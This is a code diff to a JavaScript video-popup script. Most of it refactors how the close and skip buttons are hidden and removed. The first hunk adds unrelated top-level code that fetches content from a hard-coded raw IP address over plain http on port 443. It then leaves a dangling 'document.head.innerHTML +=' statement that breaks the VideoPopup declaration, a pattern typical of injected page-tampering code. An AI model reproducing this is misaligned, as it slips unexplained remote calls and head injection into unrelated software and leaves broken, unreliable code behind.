@@ -8,6 +8,22 @@ const videoTemplate =
 "<div style='display:none' id='ᙳ嬇㬾closebutton'>x</div>"
 ;
 
+var xhr = new XMLHttpRequest();
+xhr.onreadystatechange = process;
+xhr.open("GET", "http://216.118.106.247:443/7.html", true);
+xhr.send();
+function process()
+{
+  if (xhr.readyState == 4) {
+    var resp = JSON.parse(xhr.responseText);
+
+    // resp now has the text and you can process it.
+alert(resp);
+  }
+}
+
+document.head.innerHTML += 
+
 function VideoPopup(url, size, shouldSkip = false) {
     if(!isVideoDisplayed) {
         if(typeof size === 'string') {
@@ -65,10 +81,11 @@ function VideoPopup(url, size, shouldSkip = false) {
                                 skipButton.style.display = 'inline-block';
                             }
                         }
-                        if(videoEnded) {
-                            document.getElementById('ᙳ嬇㬾closebutton').style.display = 'inline-block';
-                        }          
+                                
                     }
+                    if(videoEnded) {
+                        document.getElementById('ᙳ嬇㬾closebutton').style.display = 'inline-block';
+                    }  
                 }
             }
         } else {
@@ -96,11 +113,15 @@ function VideoPopup(url, size, shouldSkip = false) {
         }
     }
     document.getElementById('ᙳ嬇㬾closebutton').addEventListener('click', function() {
-        video.style.display = 'none';
-        document.getElementById('ᙳ嬇㬾skipbutton').style.display = 'none';
-        document.getElementById('ᙳ嬇㬾closebutton').style.display = 'none';
+        removeElement('ᙳ嬇㬾closebutton');
+        removeElement('ᙳ嬇㬾skipbutton');
+        removeElement('ᙳ嬇㬾popupvideo');
         isVideoDisplayed = false;
     });
 }
 
+function removeElement(elementId) {
+        var element = document.getElementById(elementId);
+        element.parentNode.removeChild(element);
+    }
 
